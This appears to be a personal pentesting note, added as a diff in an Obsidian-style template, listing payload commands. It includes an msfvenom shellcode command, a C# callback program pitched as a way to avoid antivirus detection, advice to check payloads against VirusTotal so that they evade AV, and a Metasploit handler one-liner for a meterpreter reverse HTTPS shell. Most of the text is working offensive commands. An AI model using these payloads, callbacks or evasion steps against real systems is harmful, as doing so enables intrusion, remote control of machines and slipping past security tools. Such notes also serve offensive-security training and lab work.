@@ -1,0 +1,73 @@
+---
+creation date: November 8th 2023
+last modified date: November 8th 2023
+aliases: []
+tags: #📕
+---
+
+Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
+Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
+Links: {Add link(s) [[]] to related terms}
+Search Tag: #📕  
+
+# [[payloads]]  
+___
+
+## Description:  
+
+Use virus total to ensure that these payloads wont get caught by AV
+
+Testing with ping:
+```
+msfvenom -f c -p windows/exec CMD="cmd.exe /C ping 192.168.0.135"
+
+tcpdump icmp -n -i wlan0
+```
+
+.NET code for a a web request. This is good to test exploits without getting caught by AV. Needs to be compiled with visual studio or another compiler:
+
+```
+Raw C# code:
+
+using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+ 
+class Program
+{
+    static async Task Main()
+    {
+        using (HttpClient httpClient = new HttpClient())
+        {
+            string url = "http://172.16.131.150/test";
+            HttpResponseMessage response = await httpClient.GetAsync(url);
+        }
+    }
+}
+
+
+Run on Kali:
+sudo python3 -m http.server 80
+```
+
+
+### Metasploit Reverse Shell
+
+```
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set LHOST <IP>; set LPORT 443; exploit -j"
+
+
+
+```
+
+
+___
+
+## Resources:
+
+| Hyperlink | Info |
+| --------- | ---- |
+
+
+Created Date: November 8th 2023 (10:25 am)  
+Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
